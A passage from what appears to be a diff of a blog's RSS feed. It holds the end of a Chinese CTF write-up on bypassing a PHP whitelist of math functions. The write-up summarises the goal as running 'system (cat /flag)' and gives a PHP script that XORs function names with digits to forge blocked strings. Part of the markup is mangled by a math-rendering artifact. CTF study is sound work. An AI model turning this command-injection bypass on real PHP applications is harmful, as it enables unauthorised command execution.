style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05764em;&#34;&gt;E&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.13889em;&#34;&gt;T&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;_GET {1}) 总的来看就是 system (cat /flag)&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+$payload = [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;,  &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39; , &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];
+for($k=1;$k&amp;lt;=sizeof($payload);$k++)&amp;#123;
+    for($i = 0;$i &amp;lt; 9; $i++)&amp;#123;
+        for($j = 0;$j &amp;lt;=9;$j++)&amp;#123;
+            $exp = $payload[$k] ^ $i.$j;
+            echo($payload[$k].&amp;quot;^$i$j&amp;quot;.&amp;quot;==&amp;gt;$exp&amp;quot;);
+            echo &amp;quot;&amp;lt;br /&amp;gt;&amp;quot;;
+        &amp;#125;
+    &amp;#125;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZteXl5MS9hcnRpY2xlL2RldGFpbHMvMTE3MDkwMDAx&#34;&gt;https://blog.csdn.net/fmyyy1/article/details/117090001&lt;/span&gt;&lt;/p&gt;
+ ]]></description>
         </item>
         <item>
             <guid isPermalink="true">http://odiws.github.io/2024/09/23/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-iamthinking/</guid>
